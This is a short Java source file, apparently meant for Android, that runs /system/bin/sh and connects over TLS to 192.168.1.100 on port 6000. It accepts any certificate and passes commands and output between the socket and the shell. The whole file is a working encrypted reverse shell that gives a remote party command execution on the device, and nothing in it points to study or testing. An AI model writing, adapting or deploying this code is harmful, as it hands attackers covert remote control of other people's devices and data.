import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import javax.net.ssl.*;
import java.io.InputStreamReader;
import java.io.BufferedReader;

public class Shell {
  public static void main(String[] args) throws Exception {
    String host = "192.168.1.100";
    int port = 6000;
    String[] cmd = {"/system/bin/sh"};

    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    SSLContext sslContext = SSLContext.getInstance("TLS");
    sslContext.init(null, new TrustManager[] {new TrustAllCertificates()}, new java.security.SecureRandom());
    SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
    SSLSocket s = (SSLSocket) sslSocketFactory.createSocket(host, port);
    s.startHandshake();
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    BufferedReader bsi = new BufferedReader(new InputStreamReader(s.getInputStream()));
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      // https://stackoverflow.com/questions/26320624/how-to-tell-if-java-sslsocket-has-data-available
      // while(si.available()>0)
        // po.write(si.read());
      String line = bsi.readLine();
      if (line != null) {
        po.write((line + "\n").getBytes());
      }
      else {
        bsi.close();
      }
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
